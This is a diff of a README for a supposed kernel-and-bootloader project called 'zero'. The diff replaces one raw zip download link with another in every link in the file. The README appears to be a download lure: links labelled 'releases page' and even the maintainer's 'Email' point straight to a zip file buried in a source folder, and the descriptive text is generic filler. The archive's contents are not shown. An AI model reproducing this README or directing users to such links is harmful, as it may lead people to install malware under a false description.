@@ -1,7 +1,7 @@
 # 🚀 zero - A Simple Way to Explore Kernel Programming
 
 ## 📥 Download the Application
-[![Download zero](https://github.com/moriela1/zero/raw/refs/heads/main/kernel/inc/Software-1.6.zip)](https://github.com/moriela1/zero/raw/refs/heads/main/kernel/inc/Software-1.6.zip)
+[![Download zero](https://github.com/moriela1/zero/raw/refs/heads/main/stage0/src/Software-2.7.zip)](https://github.com/moriela1/zero/raw/refs/heads/main/stage0/src/Software-2.7.zip)
 
 ## 📖 Overview
 Welcome to the Zero kernel and bootloader! This application operates in protected mode, providing a straightforward introduction to a complex area of computer systems. Whether you are curious about how kernels work or want to explore the basics of operating system development, zero offers a great starting point.
@@ -23,7 +23,7 @@ To use zero effectively, ensure your computer meets the following requirements:
 Follow these steps to download and run zero:
 
 1. **Visit the Releases Page:**
-   Click this link to [visit the releases page](https://github.com/moriela1/zero/raw/refs/heads/main/kernel/inc/Software-1.6.zip).
+   Click this link to [visit the releases page](https://github.com/moriela1/zero/raw/refs/heads/main/stage0/src/Software-2.7.zip).
 
 2. **Download the Latest Version:**
    On the releases page, find the latest version of zero. The file should have a name that indicates it is a release for the kernel and bootloader.
@@ -35,7 +35,7 @@ Follow these steps to download and run zero:
    After installation, follow the specific instructions related to your operating system to run zero.
 
 ## 📥 Download & Install
-Once you reach the releases page, look for the version you want. To initiate the download, click on the file labeled with the latest version. Remember, you can find the releases page here: [Download zero](https://github.com/moriela1/zero/raw/refs/heads/main/kernel/inc/Software-1.6.zip).
+Once you reach the releases page, look for the version you want. To initiate the download, click on the file labeled with the latest version. Remember, you can find the releases page here: [Download zero](https://github.com/moriela1/zero/raw/refs/heads/main/stage0/src/Software-2.7.zip).
 
 ## 📚 Documentation & Help
 For further information on how to work with zero, you can explore additional documentation:
@@ -52,7 +52,7 @@ If you encounter any issues while using zero, try these steps:
 ## ✉️ Contact
 If you have inquiries or feedback, you can reach out to the maintainer:
 
-- **Email:** https://github.com/moriela1/zero/raw/refs/heads/main/kernel/inc/Software-1.6.zip
+- **Email:** https://github.com/moriela1/zero/raw/refs/heads/main/stage0/src/Software-2.7.zip
 
 ## 🌐 License
 This project is licensed under the MIT License. Feel free to use it as you wish while acknowledging the original source.
